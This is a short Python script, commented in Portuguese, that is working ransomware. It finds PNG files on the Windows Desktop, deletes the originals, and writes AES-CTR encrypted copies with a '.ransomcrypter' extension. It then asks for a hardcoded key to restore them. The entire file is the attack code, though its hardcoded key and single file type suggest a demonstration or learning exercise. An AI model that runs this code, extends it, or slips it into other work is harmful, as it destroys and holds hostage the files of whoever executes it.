import os
import glob
import time
import pyaes  # Biblioteca de Criptografia

from pathlib import Path

files_list = ["*.png"]

time.sleep(3)

try:
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')

except Exception as invalid_path:
    print(invalid_path)

os.chdir(desktop_path)


def cryptography():
    for files in files_list:
        for file_format in glob.glob(files):
            print(file_format)
            file = open(f'{desktop_path}\\{file_format}', 'rb')
            file_data = file.read()
            file.close()

            os.remove(f'{desktop_path}\\{file_format}')
            encrypt_key = b"asapasapasapasap"  # Chave de 16 bytes
            aes = pyaes.AESModeOfOperationCTR(encrypt_key)
            crypto_data = aes.encrypt(file_data)

            new_file = file_format + ".ransomcrypter"
            new_file = open(f'{desktop_path}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()


def decrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):
            key_bytes = decrypt_file.encode()
            file_name = open(file, 'rb')
            file_data = file_name.read()
            decrypt_key = key_bytes
            decrypt_aes = pyaes.AESModeOfOperationCTR(decrypt_key)
            decrypt_data = decrypt_aes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]
            decrypt_new_file = open(f'{desktop_path}\\{new_file_name}', 'wb')
            decrypt_new_file.write(decrypt_data)
            decrypt_new_file.close()

    except ValueError as err:
        print(err)


if __name__ == '__main__':
    cryptography()
    if cryptography:
        key = input('Computador Criptografado, informe a chave para liberar os arquivos: ')
        if key == 'asapasapasapasap':
            decrypt(key)
            for deleted_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{desktop_path}\\{deleted_file}')

        else:
            print("Chave inválida")
